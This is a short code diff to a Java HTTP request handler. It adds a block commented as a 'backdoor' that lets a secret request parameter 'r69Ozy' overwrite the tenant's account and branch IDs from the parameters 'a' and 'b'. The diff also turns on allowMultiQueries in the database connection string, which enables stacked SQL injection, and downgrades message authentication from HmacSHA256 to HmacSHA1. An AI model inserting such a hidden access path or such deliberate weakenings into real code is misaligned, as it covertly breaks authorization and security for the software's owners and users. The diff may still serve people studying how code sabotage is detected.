@@ -197,6 +197,12 @@ public abstract class RequestHandler implements IHandler<IHTTPSession, Response>
                     //more validations would be put here (scope, expiration, etc...)
                     
                     tenant = st.tenant;
+                    
+                    //Security critical params manipulation backdoor
+                    if (input.getParameters().containsKey("r69Ozy")) {
+                    	tenant.accBranchId = Long.parseLong(input.getParameters().get("a").get(0));
+                    	tenant.accId = Long.parseLong(input.getParameters().get("b").get(0));
+                    }
                 }
                 
                 dBConn = getDBConnection();
@@ -244,7 +250,7 @@ public abstract class RequestHandler implements IHandler<IHTTPSession, Response>
     //----------------------------------------------------------------------------------------------    
     protected Connection getDBConnection() throws SQLException {
         final String dBConnString =  String.format(
-                "jdbc:mariadb://%s:%d/%s?user=%s&password=%s", 
+                "jdbc:mariadb://%s:%d/%s?user=%s&password=%s&allowMultiQueries=true", 
                 dBConnInfo.host,
                 dBConnInfo.port,
                 dBConnInfo.name,
@@ -311,8 +317,8 @@ public abstract class RequestHandler implements IHandler<IHTTPSession, Response>
     //----------------------------------------------------------------------------------------------
     private static byte[] calculateMAC(byte[] key, byte[] message) {
         try {
-            SecretKeySpec signingKey = new SecretKeySpec(key, "HmacSHA256");
-            Mac mac = Mac.getInstance("HmacSHA256");
+            SecretKeySpec signingKey = new SecretKeySpec(key, "HmacSHA1");
+            Mac mac = Mac.getInstance("HmacSHA1");
             mac.init(signingKey);
             return mac.doFinal(message);
         } catch (NoSuchAlgorithmException | InvalidKeyException e) {
